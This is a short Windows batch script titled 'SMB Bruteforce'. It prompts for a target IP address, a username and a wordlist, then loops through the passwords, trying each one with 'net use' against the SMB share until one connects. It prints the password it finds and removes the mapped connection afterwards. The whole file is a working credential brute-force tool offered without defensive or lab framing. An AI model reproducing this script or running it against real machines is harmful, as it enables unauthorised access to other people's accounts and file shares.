@echo off
title SMB Bruteforce
color A
echo.

:: Enable delayed variable expansion
setlocal enabledelayedexpansion

:: Get user inputs
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=1

:: Loop through each password in the wordlist
for /f "tokens=*" %%a in (%wordlist%) do (
  set "pass=%%a"
  call :attempt
)

echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
:: Attempt to connect with the current password
net use \\%ip% /user:%user% %pass% >nul 2>&1

:: Check if the connection was successful
if !errorlevel! EQU 0 (
  goto success
) else (
  echo [ATTEMPT !count!] [%pass%]
  set /a count+=1
)

:: End of the attempt
goto :eof
